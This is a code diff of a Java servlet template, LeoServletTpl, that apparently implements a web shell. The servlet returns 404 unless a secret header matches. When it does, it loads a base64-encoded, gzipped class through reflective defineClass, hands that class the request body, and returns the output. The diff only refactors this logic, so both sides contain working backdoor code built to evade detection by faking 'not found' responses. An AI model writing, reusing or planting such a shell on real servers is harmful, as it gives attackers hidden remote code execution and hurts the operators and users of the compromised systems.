@@ -25,38 +25,42 @@ public class LeoServletTpl extends HttpServlet {
 
     @Override
     protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+        String actualHeader = request.getHeader(headerName);
+        if (actualHeader == null || !actualHeader.contains(headerValue)) {
+            response.sendError(HttpServletResponse.SC_NOT_FOUND);
+            return;
+        }
+
         response.setStatus(respCode);
         try {
-            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
-                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-                byte[] buffer = new byte[1024];
-                int bytesRead;
-                try {
-                    Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader());
-                } catch (ClassNotFoundException e) {
-                    GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(base64Decode(coreClass)));
-                    while ((bytesRead = gzipInputStream.read(buffer)) != -1) {
-                        byteArrayOutputStream.write(buffer, 0, bytesRead);
-                    }
-                    Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",
-                            String.class, byte[].class, int.class, int.class);
-                    defineClassMethod.setAccessible(true);
-                    defineClassMethod.invoke(ClassLoader.getSystemClassLoader(),
-                            null, byteArrayOutputStream.toByteArray(), 0, byteArrayOutputStream.size());
-                } finally {
-                    InputStream inputStream = request.getInputStream();
-                    byteArrayOutputStream.reset();
-                    while ((bytesRead = inputStream.read(buffer)) != -1) {
-                        byteArrayOutputStream.write(buffer, 0, bytesRead);
-                    }
-                    Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader()).newInstance().equals(byteArrayOutputStream);
-                    response.getOutputStream().write(byteArrayOutputStream.toByteArray());
+            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+            byte[] buffer = new byte[1024];
+            int bytesRead;
+            try {
+                Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader());
+            } catch (ClassNotFoundException e) {
+                GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(base64Decode(coreClass)));
+                while ((bytesRead = gzipInputStream.read(buffer)) != -1) {
+                    byteArrayOutputStream.write(buffer, 0, bytesRead);
                 }
-            } else {
-                response.sendError(HttpServletResponse.SC_NOT_FOUND);
+                Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",
+                        String.class, byte[].class, int.class, int.class);
+                defineClassMethod.setAccessible(true);
+                defineClassMethod.invoke(ClassLoader.getSystemClassLoader(),
+                        null, byteArrayOutputStream.toByteArray(), 0, byteArrayOutputStream.size());
+            } finally {
+                InputStream inputStream = request.getInputStream();
+                byteArrayOutputStream.reset();
+                while ((bytesRead = inputStream.read(buffer)) != -1) {
+                    byteArrayOutputStream.write(buffer, 0, bytesRead);
+                }
+                Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader()).newInstance().equals(byteArrayOutputStream);
+                response.getOutputStream().write(byteArrayOutputStream.toByteArray());
             }
         } catch (Exception ignored) {
-            response.sendError(HttpServletResponse.SC_NOT_FOUND);
+            if (!response.isCommitted()) {
+                response.sendError(HttpServletResponse.SC_NOT_FOUND);
+            }
         }
     }
 
